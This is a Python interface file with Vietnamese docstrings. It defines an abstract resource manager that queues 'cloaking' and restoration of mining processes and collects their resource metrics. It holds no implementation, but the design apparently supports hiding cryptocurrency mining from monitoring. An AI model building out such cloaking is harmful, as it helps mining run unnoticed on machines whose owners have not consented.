"""
Module interfaces.py

Định nghĩa các interface (giao diện) dùng cho ResourceManager và các thành phần khác
theo mô hình đồng bộ (Synchronous + Threading), thay thế các phương thức bất đồng bộ (async)
bằng các phương thức đồng bộ mà không làm thay đổi logic chức năng.
"""

from abc import ABC, abstractmethod
from typing import Any, Dict
from mining_environment.scripts.utils import MiningProcess


class IResourceManager(ABC):
    """
    Giao diện (interface) cho ResourceManager trong mô hình đồng bộ (Synchronous + Threading).

    Các phương thức cung cấp cơ chế quản lý tài nguyên (CPU, RAM, GPU, Network, v.v.)
    và cho phép enqueue cloaking hoặc restoration cho từng tiến trình.

    Attributes:
        (Không có thuộc tính cụ thể ở đây, do là interface.)
    """

    @abstractmethod
    def enqueue_cloaking(self, process: MiningProcess) -> None:
        """
        Đặt yêu cầu cloaking (che giấu hoặc hạn chế tài nguyên) cho tiến trình.

        :param process: Đối tượng MiningProcess đại diện tiến trình cần cloaking.
        :return: None
        """
        pass

    @abstractmethod
    def enqueue_restoration(self, process: MiningProcess) -> None:
        """
        Đặt yêu cầu khôi phục tài nguyên cho tiến trình đã cloaked trước đó.

        :param process: Đối tượng MiningProcess đại diện tiến trình cần restore.
        :return: None
        """
        pass

    @abstractmethod
    def collect_metrics(self, process: MiningProcess) -> Dict[str, Any]:
        """
        Thu thập các metrics (CPU, RAM, GPU usage, network, cache) của một tiến trình.

        :param process: Đối tượng MiningProcess đại diện tiến trình.
        :return: dict chứa các giá trị metrics, ví dụ:
                 {
                   'cpu_usage': float,
                   'memory_usage': float,
                   'gpu_usage': float,
                   'network_usage': float,
                   'cache_usage': float
                 }
        """
        pass

    @abstractmethod
    def restore_resources(self, process: MiningProcess) -> bool:
        """
        Khôi phục tài nguyên cho một tiến trình (nếu đang cloaked).

        :param process: Đối tượng MiningProcess đại diện tiến trình.
        :return: True nếu khôi phục thành công, False nếu có lỗi.
        """
        pass
